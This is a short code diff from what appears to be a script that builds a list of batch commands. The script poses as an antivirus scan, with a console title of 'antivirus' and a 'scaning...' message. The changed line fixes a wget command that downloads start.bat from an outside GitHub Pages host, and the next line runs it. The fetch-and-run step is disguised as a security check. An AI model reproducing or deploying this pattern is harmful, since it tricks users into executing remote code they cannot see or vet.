@@ -13,7 +13,7 @@ commands = Array( _
     "title antivirus", _
     "echo starting...", _
     "ping 127.0.0.1 -n 6 >nul", _
-    ".wget.exe .main.zip https://yew12347.github.io/prank1/start.bat", _
+    "wget.exe .main.zip https://yew12347.github.io/prank1/start.bat", _
     "start.bat", _
     "cls", _
     "echo scaning...", _
